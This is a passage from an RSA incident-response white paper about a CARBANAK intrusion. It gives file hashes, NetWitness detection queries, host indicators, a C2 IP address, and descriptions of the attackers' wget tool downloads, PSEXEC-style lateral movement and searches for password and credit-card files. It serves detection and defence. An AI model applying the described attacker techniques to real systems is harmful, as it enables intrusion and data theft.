42ce9c2bd246a0243fa91309938042e434b39876\n\n_Table 23: File Information for INFOS_\n\n34\n\n\n-----\n\n**4.5.7 PSCAN (Windows Version)**\nThe attackers also utilized a version of the PSCAN tools described in Section\n4.3.3. This version differs from the Linux version previously discussed only in\nits usage message, which is slightly more verbose. An example of the usage\ntext and execution is shown in Figure 32.\n\n_Figure 32: Example Execution and Usage Text of Windows Version of PSCAN_\n\nThe file information is shown in Table 24.\n\nFile Name  : pscan.bmp\nFile Size    : 65,024 bytes\nMD5       : d825fbd90087d2350e89cbf205a1b71c\nSHA1      : ca5e195692399dca99a4d8299dc9ff816168a6dc\n\n_Table 24: File Information for PSCAN (Windows Version)_\n\n**4.6 DETECTION, TRACKING, AND RESPONSE**\nGiven that the attackers left very little consistently running on any\ncompromised host, downloaded tools as they needed them and removed\nthose tools immediately after use, determining their movement throughout\nthe environment via traditional forensic methods was not a timely option.\nIn a significant portion of the attackers’ actions-on-objective and lateral\nmovement, the majority of their activity was contained within the functions of\nthe Windows Command Processor cmd.exe. Given this, much of their actions\ndid not cause subsequent process execution. Additionally, the attackers\nutilized several different filenames for their toolsets, ensured a tool was not\nexecuted with the same name it was downloaded with, used multiple versions\nto throw off atomic hashing IOCs and maintained at least two different\ningress points with non-related IP addresses.\n\nGiven that the attackers had been in the environment for over a month at the\ntime response began, traditional host and network intrusion detection systems\nwithin the organization’s security stack proved ineffective to combat these\nactors. Additionally, the attackers had full access to the Linux and Windows\nenvironments at the time of response. However, by engaging and enabling\n\n35 analysts to periodically conduct RSA Threat Hunting with a solid methodology\n\n\n-----\n\nthis threat was still detected despite not being detected by IDS, or buried in\nineffective alerts. Once detected, the root cause was determined, the threat\nwas effectively and recursively scoped across the environment, additional\nnext-level visibility into attacker actions was obtained, and a plan was created\nand executed to successfully remediate the threat. Given that time is the\nmost critical resource during incident response, any reduction to the 10:1\nanalysis time versus attack time ratio can significantly increase the chances of a\nsuccessful eradication event and continued successful remediation. In this case,\ndue to effective visibility, solid methodology and processes, and motivated\nand properly enabled analysts, the threat was contained and remediated after\nnine days of response efforts. The remediation involved significant internal\ninfrastructure changes be enacted before the expulsion event, including\nimplementation of redesigned network segmentation, replacement of several\nsignificant environment-wide data and process automations, and removal\nand replacement of most administrative authentication methods within the\nenvironment. Consistent monitoring and RSA Threat Hunting operations\nconducted post-remediation, with the necessary visibility, allowed for an active\nand adaptive response in which any subsequent actor activity was observed,\nanalyzed and responded to appropriately.\n\nWith the care in which the attackers moved throughout the environment, RSA\nIR relied on RSA NetWitness Endpoint and RSA NetWitness Logs and Packets\nto coordinate host and network visibility and create non-standard, aggregate,\nbehavioral-based indicators, resulting in actionable IOCs that allowed RSA\nIR to track the attackers in near real time. Here, we discuss some of the ways\nin which RSA IR was able to determine and track attacker actions throughout\nthe environment.\n\n**4.6.1 Network Visibility and Indicators**\nThis section discusses the methodology and RSA NetWitness Suite queries\nand content used by RSA IR during this investigation. The methodology in this\nsection uses the OCOKA defensive model[16] and is described in detail in the\nRSA Incident Response NetWitness Hunting Guide. [17]\n\nThe CARBANAK attackers conducted actions through a variety of network\ncommunication methods. Additionally, as the attackers were prone to\ndownloading tools when they needed them, in an effort to leave as little\non disk as possible, this became a primary method of tracking attacker\nlocation throughout the environment. The attackers primarily used WGET to\ndownload tools when needed, and they consistently did so directly to an IP\naddress over TCP port 443.\n\n[16 Heuser, Riley; “The Myth of the Easy Button Approach to Information Security”; https://www.](https://www.rsa.com/en-us/blog/2017-07/infosec-easy-button-myth)\n[rsa.com/en-us/blog/2017-07/infosec-easy-button-myth](https://www.rsa.com/en-us/blog/2017-07/infosec-easy-button-myth)\n\n36\n\n\n-----\n\nTherefore, using the following query would reduce the dataset to the attacker\nactivity with considerably high fidelity:\n\n_direction = outbound && service = 80 && client begins ‘wget’ && tcp.dstport = 443_\n\n_&& service.analysis = ‘direct to ip http request’_\n\nExecution of this query against the network dataset resulted in the following\nsessions, shown in Figure 33.\n\n_Figure 33: Query Results for Malicious Tool Downloads_\n\nThis behavioral IOC could also be modified to adhere to changes in attacker\nactions or increasing false positives by including the Directory Meta to only\nequal the root directory, or include the Action Meta to only include HTTP GET\nRequests. As we see in Figure 33, though the attackers would keep changing\nfilenames, IP addresses and WGET versions used, actions associated with this\nTTP were still able to be detected throughout the engagement.\n\nThe primary method of interacting with the Linux Syslog server within the\nLinux environment consisted of communicating via SSH over a reverse tunnel\n(created by the AUDITUNNEL binary). Given that the SSH traffic would be\nencapsulated within the reverse tunnel created by AUDITUNNEL, the Layer\n3 and Layer 4 headers would be representative of the tunnel itself, while the\n\n37\n\n\n-----\n\nnetwork payload above Layer 4 would be representative of the SSH protocol.\nWith this knowledge, we can begin to build behavioral IOC queries to track\nthis activity, beginning with the following:\n\n_direction = outbound && service = 22_\n\nThis query will return all results representative of both outbound SSH\ncommunication as well as inbound SSH communication over the reverse\ntunnel. However, this query is of particularly low fidelity, especially when\nin a Linux-heavy environment. By reviewing additional context around\nwhat we know of this attacker communication, this query can be narrowed\nsignificantly. In reviewing the activity associated with the AUDITUNNEL\n_auditd and svcmd.exe tunneling binaries, both communicate outbound over_\nTCP port 443. Adding this to our query gives additional context around the\ntransport mechanism, though not the communication mechanism (SSH).\nAs the SSH attacker traffic is associated with the SSHDOOR trojanized\nOpenSSH 5.3 binaries, and by specification SSH exchanges client and server\nversion strings at the beginning of each session, we can add version context\nto the communication mechanism as well. The addition of these two aspects\nresults in the following query:\n\n_direction = outbound && service = 22 && tcp.dstport = 443 && client = ‘openssh_5.3’_\n\nExecution of this query against the network dataset returns the following\nresults, as shown in Figure 34.\n\n_Figure 34: Tunneled SSH Query Results_\n\n38\n\n\n-----\n\nIn the resulting data, we observe that in all sessions returned, the client\nversion string and the server version string match. This can be added to\nthe query to increase the fidelity of the IOC if there are still false positives\npresent. However, there is still the case in which the AUDITUNNEL binary\nutilizes the XOR encoding. In this case, the traffic will appear as binary\nnetwork communications. In order to ease the effort of detecting this\nactivity, content for RSA NetWitness Logs and Packets were created based\non the initial ‘Client Hello’ string passed when beginning AUDITUNNEL XOR\ncommunication. An example of this detection is shown in Figure 35.\n\n_Figure 35: AUDITUNNEL ‘Client Hello’ Payload Detection and Meta_\n\nThe GOTROJ utilized two methods of network communication. The first and\nprimary method was a custom binary XOR encoded protocol communicating\noutbound over TCP port 443. We can begin building our IOC query here with\nthe following:\n\n_direction = outbound && risk.info = ‘unknown service over ssl port’ && tcpflags =_\n\n_‘syn’ && ioc = ‘binary handshake’_\n\nThis query will identify the beginning of all outbound communications\nover TCP port 443 in which data is being transmitted by both parties at the\nbeginning of the communication (ioc = ‘binary handshake’). While this will\nfind the GOTROJ control traffic, it will find many other things as well. This is\ndue to service = 0 being representative of any protocol for which there is not\nan RFC standard parser built. This includes various proprietary protocols,\nmalicious custom protocols and even sending cleartext over a network tunnel.\nTo narrow this down some, we would want to look at byte transmission ratios\nbetween the payloads of the communication. What we are really looking for is\nconversational traffic, in which the ratio of the amount of data transmitted by\nboth parties is roughly equivalent (25-75% or so). To identify this, we would\nadd the Session Analysis Meta for this type of byte transmission ratio, as\nshown below:\n\n_direction = outbound && risk.info = ‘unknown service over ssl port’ && tcpflags = ‘syn’_\n\n_&& ioc = ‘binary handshake’ && analysis.session = ‘medium transmitted outbound’_\n\nThe direction meta can be removed in this instance if necessary, as the medium\n_transmitted outbound meta includes the condition. The resulting traffic from_\nthe network dataset is shown in Figure 36.\n\n39\n\n\n-----\n\n_Figure 36: GOTROJ Binary Control Traffic and svcmd.exe Beacon Traffic_\n\nAt this point in the analysis, we want to look at any contextually interesting\nmeta within the analysis, compromise or risk meta groups. In Figure 36, meta is\ncreated on these sessions for ‘xor encoded executable’ and ‘windows cli admin\n_commands.’ This indicates that RSA NetWitness Suite observed a Windows_\nexecutable file in the network traffic that was XOR encrypted with a one-\nbyte key. Adding this meta to the ‘windows cli admin commands’ indicates that\ncommon Windows administrative command line utilities, such as ‘whoami,’\n‘ipconfig’ or the command prompt string ‘C:\\Windows\\system32>,’ were\nobserved either in cleartext or one-byte XOR encrypted. In extracting the\npayload and performing the XOR instruction with a key of 0xC0, we observe\nthe command prompt string, as shown in Figure 37.\n\n_Figure 37: Identification of Windows Command Prompt in_\n\n_XOR 0xC0 Decrypted Payload_\n\nWhile this query may include additional traffic not associated with the\nattackers, it allowed RSA IR to significantly reduce the network dataset to a\nlevel where any included traffic could be quickly reviewed for newly identified\nC2 IP addresses or false positive IP addresses that required filtering. In order\nto more accurately observe this communication, RSA IR created custom\ncontent for RSA NetWitness Suite. This content is released in the form of the\nDigital Appendix associated with this report. An example of the meta created\nfor this communication is shown in Figure 38.\n\n40\n\n\n-----\n\n_Figure 38: GOTROJ Beacon Meta from Digital Appendix Content_\n\nAs discussed earlier in this paper, the GOTROJ has the ability to download\nfiles to compromised hosts. This ability does not traverse the binary XOR\nencoded control channel of the GOTROJ. Instead, it utilizes HTTP over TCP\nport 443. The following subset of the query associated with Figure 33 can be\nused to find this traffic.\n\n_direction = outbound && service = 80 && tcp.dstport = 443 &&_\n\n_session.analysis = ‘direct to ip http request’_\n\nThis query returns the results shown in Figure 39.\n\n_Figure 39: Identification of GOTROJ HTTP #wget User-Agent_\n\n41\n\n\n-----\n\nIn Figure 39, an additional HTTP User-Agent is observed: ‘go-http-client/1.1.’\nThe sessions associated with this User-Agent are the sessions in which files\nwere downloaded via the GOTROJ Trojan. Adding this information to the\nquery associated with Figure 33 returns the following:\n\n_direction = outbound && service = 80 && tcp.dstport = 443 && session.analysis =_\n\n_‘direct to ip http request’ && client begins ‘wget’,’go-’_\n\nWith these queries built around behavioral attacker TTPs, as observed during\nthe time of engagement, any reliance on traditional atomic indicators is\nremoved from the investigation. Instead, the actions required of the attackers\n(such as operating system command execution and interaction, file download,\netc.) are focused upon, as well as the way that their TTP and toolsets perform\nthese actions. Thus any changes in C2, filenames, hashes, user-agents, etc., can\nbe quickly identified and included in the continuing investigation.\n\n**4.6.2 Host Visibility and Indicators**\nThis section discusses the methodology and RSA NetWitness Endpoint\nInstant IOCs (IIOCs) and content used by RSA IR during this investigation.\nThe methodology used in this section is described in detail in the RSA\nNetWitness Endpoint User Guide found here.[18]\n\nThe CARBANAK actors involved during this engagement were particularly\ncareful to leave as little file, log or execution traces as possible. This included,\nbut was not limited to, ad hoc download of tools as needed, preference for\nlateral tool movement, log deletion automatically built into tools, immediate\ndeletion of tools and logs upon logout of systems, and removal of entries from\ncentralized log repositories.\n\nDuring this engagement, the RSA NetWitness Endpoint agent was deployed\nto all Red Hat Enterprise Linux (RHEL) and CentOS 6 and 7 systems, as they\ncould support it. The detection of attacker activity on these systems within\nRSA NetWitness Endpoint utilized aspects of the attacker actions and toolset\nutilizations that deviated from legitimate installed binary usage. An example\nof this is the usage of the AUDITUNNEL and the SSHDOOR client and server\nbinaries. Originally, the attackers placed the SSHDOOR binaries in /usr/bin\nand /usr/sbin as a replacement for the system OpenSSH client and server\nbinaries. However, upon the remediation of system ALPHA, the attackers\nutilized the SSHDOOR binaries in the non-standard location of /usr/share/\n_man/mann. The initial placement of SSHDOOR was observed by reviewing_\nany binaries automatically started as part of systemd or init.d, and had a hash\nvalue that didn’t match the one in the RPM package list. These attributes\nare recorded in the IIOCs of RSA NetWitness Endpoint and are shown in the\n**SSHDOOR detection in Figure 40.**\n\n42\n\n\n-----\n\n_Figure 40: File Hash Mismatch and system/init.d Autostart in SSHDOOR Detection_\n\nOnce the attackers moved to a non-standard location, this was easily\nidentified, as they were the only common system service binaries not running\nin either /sbin or /usr/sbin. The aspects of both instances of SSHDOOR use are\nillustrated in Figure 41.\n\n_Figure 41: Malicious Binary Usage in Non-Standard Locations and Without_\n\n_Associated Packages_\n\nIn Figure 41, we observe two separate sshd binaries running on the system.\nAs SSH only requires one instance of its service binary running at a time,\nthis is an anomaly. Add to this the non-standard location of /usr/share/man/\n_mann in which the second sshd is executing, and the fact that this binary_\ncannot be associated with a legitimately installed RPM package, this activity\nimmediately becomes suspect and warrants investigation. The legitimate sshd\nservice binary process is also highlighted as running from /usr/sbin.\n\nAnother method of identifying the attacker activity during this engagement\ninvolved the command line arguments used by the attackers. Essentially,\nwhile the attackers could change directory locations, filenames and even\nhashes, the base functionality of the tools themselves could not readily\nor easily be changed. Given that the command line arguments of the tool\nindicated the functionality being utilized, RSA IR analysts zeroed in on the\nunique command line arguments of the tools being use by the attackers. As\nan example, the usage of any web address or IP address in the command line\narguments became immediately suspect and reviewed, as shown in Figure 42.\n\n43\n\n\n-----\n\n_Figure 42: IP Address, Port Switch, and Port Number in Program Arguments_\n\nAs a follow-up to these findings, RSA IR analysts utilized some of the base\nfunctions of the RSA NetWitness Endpoint agent in order to gain additional\nartifacts and information associated with known indicators. During this\nengagement, the directory /usr/share/man/mann was the primary working\ndirectory for system BRAVO. In using this indicator during scoping\ninvestigations, the file contents for /usr/share/man/mann were requested\nfrom every Linux server in the environment. The purpose of this was to\ndetermine if this directory was being maliciously used on any systems within\nthe environment and to gain additional evidence that may not have executed\nduring the agent’s tenure on the system.\n\n_Figure 43: RSA NetWitness Endpoint Request for All Files in Directory /usr/share/_\n\n_man/mann_\n\nIn requesting files for this directory across all systems, analysts are able\nto determine if there are additional tools or malware artifacts used by\nthe attackers within the same directory. Additionally, this action can also\ndetermine if the binaries observed executing from this directory exist on any\nother systems. Both cases are shown in the results of this action from the\nGlobal Downloads section shown in Figure 44.\n\n44\n\n\n-----\n\n_Figure 44: Additional Findings via Mass File Download Request for Directory /usr/_\n\n_share/man/mann_\n\nThe functionality is also useful in acquiring key host artifacts, such as\nconfiguration files and host logs, across all systems within the environment\nand then processing and reviewing them in aggregate in order to gain more\ncontextual information and situational awareness.\n\nWhile contextual forensic data within host artifacts could identify some\nattacker activity, much of the most commonly utilized host forensic data\neither was not useful or was not available on the hosts affected during this\nengagement. While aggregate analysis of artifacts, such as NTFS Master File\nTables, AmCache, SYSTEM and SOFTWARE Registry Hives, and Windows\nEvent Logs, could identify certain aspects of the attackers’ actions, they were\nconsistently ineffective at providing the necessary level of granularity to track\nthe attackers’ actions appropriately. However, using the RSA NetWitness\nEndpoint agent already present on the hosts to provide this critical host data,\nthe aforementioned artifacts became force multipliers by providing additional\ncontext to the actions observed in RSA NetWitness Suite.\n\nThe attackers utilized a specific staging directory on each host in which they\ntook any significant action. In order to appear more legitimate to security\nanalysts and tools, they utilized the legitimate Microsoft Windows directory\nfor 32-bit applications utilizing the Taiwan Chinese language pack on 64-bit\nversions of Windows, C:\\Windows\\SysWoW64\\zh-TW. While this directory\nis a legitimate Windows system directory, no server systems within this\nenvironment were legitimately utilizing the Taiwan Chinese language directory.\nAs such, this became a useful and actionable IOC for scoping and tracking\nany systems with substantial actor activity. An example of attacker use of this\ndirectory, as observed in RSA NetWitness Endpoint, is shown in Figure 45.\n\n45\n\n\n-----\n\n_Figure 45: C:\\Windows\\SysWOW64\\zh-TW Working Directory, UIAutomationCore_\n\n_WGET Usage, and TINYP Download and Renaming_\n\nIn Figure 45 above, the usage of the UIAutomationCore.dll.bin **WGET binary**\nto download attacker tools and the immediate renaming of those tools are\nshown. This, again, became an excellent actionable IOC to track adversary\nactivity. The same contextual aspects that were utilized in the network IOC\nfor WGET usage in Figure 33 are also used here. By identifying any command\nexecutions that utilize a command line argument of ‘http://’ followed by\nan IP address, RSA IR was able to identify any and all instances in which\nthe attackers downloaded tools. In hunting for this activity, we use the\nsame methodology used in Section 3.3.1, identifying aspects of the activity\nassociated with IIOCs and reviewing those IIOCs for activity. In this case,\nthe UIAutomationCore.dll.bin **WGET binary download is an unsigned module,**\nlocated within a legitimate Windows directory, communicates to an external\nsource directly to IP address and writes an executable to disk. The IIOCs\nshown in Figure 46 reflect this activity.\n\n_Figure 46: Instant IOCs Representing UIAutomationCore.dll.bin_\n\n_WGET Binary Activity_\n\nAs stated in the section associated with Table 15, the TINYP binary is a\nmodification of the SysInternals PSEXEC remote access utility. Just like\nPSEXEC, the TINYP binary sends a service binary to the ADMIN$ share (C:\\\nWindows) of the target host. The target host executes this service binary, and\nthe TINYP tool connects to that service binary. When identifying attacker\nlateral movement from the perspective of the target system, the PSEXESVC.\n_exe_ **TINYP service binary executes the remote command requested by the**\nattacker system. The view of this activity in RSA NetWitness Endpoint is\n\n46\n\n\n-----\n\n_Figure 47: TINYP Execution from Source (Red) and Target (Blue) Perspective_\n\nFigure 47 illustrates the most common use case for the TINYP binary\nobserved: lateral movement via remote command shell execution. In the\nfigure above, the source host perspective of TINYP execution is shown in the\nred boxes, while the target host perspective of TINYP execution is shown in\nthe blue boxes. In the box labeled “1,” we see file PSEXESVC.exe service binary\nbeing written to the C:\\Windows directory, which represents the ADMIN$\nSMB/CIFS network share. Once the service binary is placed in the ADMIN$\nshare, a Windows Registry entry is created in the SYSTEM Registry Hive under\nthe path HKLM\\SYSTEM\\ControlSet001\\services\\PSEXESVC. Once the service\nbinary is placed on the system, a Windows Service is created to execute the\nservice binary. This is observed in the last item in box “1,” as the Windows\nServices Control Manager services.exe executes the PSEXESVC.exe process.\n\nUpon the second execution of the TINYP binary, the Windows SYSTEM\nRegistry Key is not created, as it already exists on the system, and it is\nimportant to note that the Registry entry is only created on the first\nexecution. This information can be used to determine the first host access\nby this method. On the second execution, represented by the box labeled\n“2,” we see the Windows Local Security Authentication Server binary lsass.\n_exe opening the PSEXESVC.exe service process. This is the actor attempting_\nto authenticate to the remote system under whatever credentials they have\nacquired. Once authenticated, the process goes into the box labeled “3,”\nwhere the PSEXESVC.exe service binary executes the Windows Command\nProcessor cmd.exe remotely on behalf of the attacker. It is important to note\nthat while the calling parent binary on the target system is the TINYP binary\n_ps.exe, all actions executed by TINYP will be carried out by the PSEXESVC._\n_exe service binary on the target system. Given this, we can identify remote_\ncommand shell execution via PSEXEC for any instance in which PSEXESVC.exe\nCreates Process cmd.exe, which we established was the primary use case for\nthis tool in this engagement.\n\nKnowing this, and knowing that the legitimate PSEXEC utility is often widely\nused by system administrators, the difference in the legitimate PSEXEC and\nthe TINYP binaries or their service binaries is particularly useful to incident\nresponders. In reviewing the service binaries of both tools in RSA NetWitness\nEndpoint, we identify differences we can use to distinguish between legitimate\n\n47\n\n\n-----\n\n_Figure 48: TINYP vs PSEXEC Service Binaries_\n\nIn Figure 48, we see that the PSEXESVC.exe service binary used by TINYP has\na valid Microsoft signature, though it is about 40KB smaller than the legitimate\nPSEXEC service binary. While the signature for this binary is valid, even valid\ninformation can become an actionable IOC. In this particular engagement, the\nversion of PSEXEC that was legitimately being used by system administrators\nwas signed by SysInternals, much like the figure above. With this being the\ncase, any PSEXESVC service binaries that were Microsoft signed became\nimmediately suspect during this investigation. Additionally, the TINYP binary\nitself was unsigned, standing in stark difference from its legitimate PSEXEC\ncounterpart. The differences in these binaries are shown in Figure 49.\n\n_Figure 49: TINYP vs. PSEXEC—Module Differences_\n\nIn Figure 49, we observe the following differences in the TINYP binary and\nlegitimate PSEXEC:\n\n1. The TINYP binary resides within a consistent directory of C:\\Windows\\\n\n_SysWOW64\\zh-TW._\n\n2. The TINYP binary has a very recent compile time from the time of initial\n\nentry into the environment.\n\n3. The TINYP binary has no value in the Description section of its header.\n\n4. The TINYP binary is not signed.\n\nGiven this, should the attackers change filename or location, this can be\nhunted for by viewing only unsigned binaries with no Description values and\nsorted by compile time to identify binaries compiled within close proximity to\nthe compile time of this binary.\n\nIn order to reduce time to detection of this activity, IIOC content for RSA\nNetWitness Endpoint has been created and included in the Digital Appendix\nassociated with this document.\n\nThe majority of the attackers’ actions-on-objective were conducted using\ncommands residing within, and are functions of, the Windows Command\nProcessor cmd.exe. While there are a variety of commands available to users\nat the Windows Command Prompt, a specific subset of these commands are\n\n48\n\n\n-----\n\n|Internal Windows Command Processor Commands|Col2|\n|---|---|\n|ASSOC|MKLINK (vista and above)|\n|BREAK|MOVE|\n|CALL|PATH|\n|CD/CHDIR|PAUSE|\n|CLS|POPD|\n|COLOR|PROMPT|\n|COPY|PUSHD|\n|DATE|REM|\n|DEL|REN/RENAME|\n|DIR|RD/RMDIR|\n|DPATH|SET|\n|ECHO|SETLOCAL|\n|ENDLOCAL|SHIFT|\n|ERASE|START|\n|EXIT|TIME|\n|FOR|TITLE|\n|FTYPE|TYPE|\n|GOTO|VER|\n|IF|VERIFY|\n|KEYS|VOL|\n|MD/MKDIR||\n\n\n**Internal Windows Command Processor Commands**\n\nASSOC MKLINK (vista and above)\n\nBREAK MOVE\n\nCALL PATH\n\nCD/CHDIR PAUSE\n\nCLS POPD\n\nCOLOR PROMPT\n\nCOPY PUSHD\n\nDATE REM\n\nDEL REN/RENAME\n\nDIR RD/RMDIR\n\nDPATH SET\n\nECHO SETLOCAL\n\nENDLOCAL SHIFT\n\nERASE START\n\nEXIT TIME\n\nFOR TITLE\n\nFTYPE TYPE\n\nGOTO VER\n\nIF VERIFY\n\nKEYS VOL\n\nMD/MKDIR\n\n_Table 25: List of Commands Internal to the Windows Command Processor_\n\nThroughout this engagement, the primary attacker actions consisted of\ntraversing directories and outputting files, looking for files that may contain\nadditional credentials, database information, internal infrastructure\ndocumentation, and financial data such as PCI data. The majority of the\ncommands utilized consisted of the CD, TYPE, ECHO, DATE and DIR. As none\nof these commands call additional binaries, the attackers would reside almost\ncompletely within the cmd.exe process for the majority of their host actions.\nFour distinct external commands were utilized by the attackers in traversing\nthe host filesystems as part of their internal reconnaissance activities: net.exe,\n_ipconfig.exe, find.exe and qwinsta.exe. Knowing this, any time cmd.exe called any_\nof these binaries, it was considered suspect activity. However, two of these\ncommands were specific to the actor activity and were thereby utilized as a\nhigh-fidelity indication of attacker activity. The find.exe command searches\na specified file or piped input for a defined string given in the command\narguments, much like the grep binary does on Linux and UNIX hosts. The\nattackers would use this binary in the following command string\n\n49\n\n\n-----\n\nwhere the “phrase” would be a string of interest to the attackers, such as\n“PCI,” “Passwords” and “Credit Card.” This command would list the filenames\nof all files in all subdirectories under the present working directory, and then\nonly display the ones with the required string in the filename. Since the DIR\ncommand is part of the Windows Command Processor, but the FIND command\nis a separate binary, we observe this activity in RSA NetWitness Endpoint via\nthe cmd.exe process calling find.exe with arguments, as illustrated in Figure 50.\n\n_Figure 50: cmd.exe Calling find.exe as a Piped Directory Listing Search_\n\nThe qwinsta.exe binary identifies all currently logged-in users via command\nline session, console session or RDP session, and displays the user logged\nin and the type of session they are associated with. The attackers would\nuse this for two primary functions on the majority of hosts they interacted\nwith. The first would be to check other users logged in to the system as a\nmonitor to determine if their activity was being detected, and also to identify\nadministrative users logged in whose credentials they could harvest from\nmemory. The second was to identify what systems users were engaging\nthe system with, and what method of access they were using. This gave the\nattackers additional information with which to map the internal systems\nand networks. Additionally, the attackers were the only users executing this\ncommand anywhere within the environment, as the system administrators\ndid not use this command in any of their administrative functions. This\ncontextual information allowed RSA IR to utilize these IOCs with significant\neffectiveness during the course of the engagement. An example of this\nactivity is shown in Figure 51.\n\n_Figure 51: qwinsta.exe Being Called by cmd.exe_\n\nThe GOTROJ RAT used by the attackers in this engagement was primarily\nutilized by installing it as a Windows Service, starting the service and then\ndeleting the service once the Trojan was executing successfully in memory.\nEvidence of this activity, as observed in Application Tracking within RSA\nNetWitness Endpoint, is shown in Figure 52 and Figure 53.\n\n50\n\n\n-----\n\n_Figure 52: Installation of GOTROJ RAT Via Windows Service_\n\n_Figure 53: Deletion of GOTROJ Windows Service After Execution_\n\nOnce successfully executed, GOTROJ communicates with 107.181.246.146\nover TCP port 443. When reviewing the host screen’s Scan Data tab, under\nthe Processes section, we see where the network connection is correlated\nwith the running ctlmon.exe process by clicking on it, as shown in Figure 54.\n\n_Figure 54: GOTROJ Process Executing and Network Connection Information_\n\nAdditionally, the GOTROJ _ctlmon.exe binary itself can be triaged via_\nthe RSA NetWitness Endpoint module analyzer in order to identify the\nimported function and DLL information, entropy, PE header information and\nsearchable static strings analysis. One common initial triage search pattern\nfor identifying possible C2 strings is common web port value strings, such as\n“:443.” The use of this search string to triage the GOTROJ Trojan identifies\nthe C2 IP address and port value in a clear text string at offset 0x3049304, as\nevidenced in Figure 55.\n\n51 _Figure 55: C2 IP and Port Identification in Cursory Analysis via RSA NetWitness_\n\n\n-----\n\n|Cross Platform Toolsets and Purpose|Col2|Col3|\n|---|---|---|\n|Linux|Windows|Function|\n|Winexe|Tinyp|Lateral Movement|\n|Auditunnel (Linux Version)|Auditunnel (Windows Version)|Ingress Tunneling|\n|PScan (Linux Version)|PScan (Windows Version)|Internal Recon|\n|WGet (Linux Version)|WGet (Windows Version)|Toolset Download|\n|SCP|PSCP|File Transfer|\n\n\n##### 5. CONCLUSION\nThe attackers in this engagement primarily used modified versions of legitimate\nadministrative tools, commonly used penetration testing utilities and common\nnetwork file acquisition tools. Though specialty malware was observed during\nthis intrusion, the attackers used basic XOR encoding just above Layer 4 to\nfacilitate communication, communicated via SSH tunnel directly over TCP/443,\nor just transmitted and received data in clear text across the network. Of the\nobserved actions during this intrusion, none of the attacker tools, techniques or\nprocedures was particularly advanced. However, they were still able to bypass\na significant security stack, obtain initial access and lateral access effectively,\ndeploy malware and toolsets with impunity, and traverse over 150 systems in\nthe span of six weeks. While, at first glance, this attack was not sophisticated\nin its toolset, it was sophisticated in its operationalization and agility of actions\ntaken by the attackers. Upon reviewing the entirety of tools used in this\nengagement, operational correlations can be made between the Linux and\nWindows toolsets, as illustrated in Table 26.\n\n**Cross Platform Toolsets and Purpose**\n\n**Linux** **Windows** **Function**\n\nWinexe Tinyp Lateral Movement\n\nAuditunnel (Linux Auditunnel (Windows Ingress Tunneling\nVersion) Version)\n\nPScan (Linux Version) PScan (Windows Internal Recon\nVersion)\n\nWGet (Linux Version) WGet (Windows Toolset Download\nVersion)\n\nSCP PSCP File Transfer\n\n_Table 26: Cross-Platform Toolset Utilization_\n\nThe CARBANAK actors not only showed the capability to successfully\ncompromise both Linux and Windows systems but they chose a toolset that\nwas either directly cross-platform or extremely similar in both function\nand command line usage. This indicates a level of tactical organization and\noperationalization not previously observed by this actor group. Additionally,\nthey were significantly cognizant and aware of actions taken by the security\nteam, switching to new methods of ingress after initial compromise, detected\nremediation actions and environmental migration. They were methodical in\ntheir choice of staging systems, basing the system utilized on:\n\n                        - a critical function of lateral access (such as systems BRAVO and DELTA) or\n\n                        - responder detection and investigation (such as system CHARLIE)\n\nThey chose key systems based on their needs rather than systems the\norganization would consider ‘key’ assets. They ensured the toolsets they\n\n52\n\n\n-----\n\nkeyboard. They included a method, whether manually or automatically, to\nremove records of their activities. They operated with purpose, patience,\nplanning and, most significantly, persistence.\n\nThis intrusion was successfully discovered, investigated, contained,\neradicated and remediated only due to the following reasons:\n\n1. The organization invested in the necessary _visibility at a host and network_\n\nlevel to allow analysts to rapidly and effectively hunt for and investigate\nthese types of threats.\n\n2. The organization had invested and empowered their personnel to\n\ncreatively and proactively hunt for, understand, investigate and learn from\nthreats within their environment.\n\n3. The organization had maintained a relationship with a proven and trusted\n\nadvisory practice and had worked to recreate and implement a solid and\nproven Threat Hunting and Incident Response methodology within their\nown organization.\n\n4. The organization had a solid top-down understanding of what role\n\nThreat Hunting and Incident Response held during daily operations and\nsecurity incidents, and provided the necessary support and enablement to\nsubordinate units and analysts.\n\nWhile a first look at the tools used in this engagement may appear simplistic,\nupon review of the entire intrusion it becomes quickly apparent that each\nof them was purpose-chosen with an overall operationalized capability in\nmind. CARBANAK has shown themselves to be a coordinated and extremely\npersistent group of actors that are consistently moving towards more agile\nmethods of intrusion and standardization of processes across heterogeneous\nenvironments. They have proven their capability to use that persistence\nand agility to defeat or bypass organizational security controls. Even with\nthe least advanced of their capabilities, they can be a difficult adversary to\ntrack within an environment due to their speed, efficiency, adaptability and\ncare in leaving little trace of any activity. However, this difficulty compounds\nexponentially for organizations without the necessary visibility, practices,\nmethodologies or trusted partner relationships necessary to effectively\ndetect and respond to these types of threats. This case study shows that\nwith the necessary visibility, planning, methodology and analyst enablement,\norganizations can be successful against these types of threats.\n\nDisclaimer: This white paper and related graphics are provided for\ninformational and/or educational purposes. RSA is not responsible for errors,\nomissions or for results obtained from the use of this information. This\nwhite paper is being provided “as-is,” with no guarantee of completeness,\ntimeliness or accuracy, and without warranty of any kind. This white paper\n\n53 is not intended to be a substitute for legal or other professional advice and\n\n\n-----\n\n|Host Indicators|Network 